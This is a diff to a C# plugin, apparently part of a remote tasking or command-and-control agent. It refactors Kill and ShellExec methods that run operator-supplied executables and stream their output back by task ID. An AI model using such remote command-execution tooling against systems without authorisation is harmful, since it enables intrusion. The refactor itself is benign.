@@ -22,21 +22,21 @@ namespace Plugins
             {
                 Console.WriteLine(e);
                 //oh no an error
-                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
             }
         }
         public void Kill(Dictionary<string, string> args)
         {
             try
             {
-                if (runningProcs.ContainsKey((string)args["task-id"]))
+                if (runningProcs.ContainsKey(args["task-id"]))
                 {
-                    runningProcs[(string)args["task-id"]].Kill();
-                    runningProcs[(string)args["task-id"]].WaitForExit();
+                    runningProcs[args["task-id"]].Kill();
+                    runningProcs[args["task-id"]].WaitForExit();
 
                     PluginHandler.AddResponse(new ResponseResult()
                     {
-                        task_id = (string)args["task-id"],
+                        task_id = args["task-id"],
                         user_output = "Job Cancelled.",
                         completed = "true",
                     });
@@ -47,7 +47,7 @@ namespace Plugins
 
                 PluginHandler.AddResponse(new ResponseResult()
                 {
-                    task_id = (string)args["task-id"],
+                    task_id = args["task-id"],
                     user_output = e.ToString(),
                     completed = "true",
                     status = "error",
@@ -57,12 +57,12 @@ namespace Plugins
         public ResponseResult ShellExec(Dictionary<string, string> args)
         {
             string parameters = "";
-            if (!String.IsNullOrEmpty((string)args["arguments"]))
+            if (!String.IsNullOrEmpty(args["arguments"]))
             {
-                parameters = (string)args["arguments"];
+                parameters = args["arguments"];
             }
 
-            string executable = (string)args["executable"];
+            string executable = args["executable"];
 
             Process process = new Process
             {
@@ -80,8 +80,8 @@ namespace Plugins
 
             try
             {
-                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) PluginHandler.Write(errorLine.Data + Environment.NewLine, (string)args["task-id"], false, "error"); };
-                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) PluginHandler.Write(outputLine.Data + Environment.NewLine, (string)args["task-id"], false); };
+                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) PluginHandler.Write(errorLine.Data + Environment.NewLine, args["task-id"], false, "error"); };
+                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) PluginHandler.Write(outputLine.Data + Environment.NewLine, args["task-id"], false); };
 
                 process.Start();
                 process.BeginErrorReadLine();
@@ -91,7 +91,7 @@ namespace Plugins
                 ResponseResult result = new ResponseResult()
                 {
                     user_output = Environment.NewLine + "Process Finished.",
-                    task_id = (string)args["task-id"],
+                    task_id = args["task-id"],
                     completed = "true",
                 };
 
@@ -108,7 +108,7 @@ namespace Plugins
                 {
                     //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                     user_output = Environment.NewLine + e.ToString(),
-                    task_id = (string)args["task-id"],
+                    task_id = args["task-id"],
                     completed = "true",
                     status = "error"
                 };
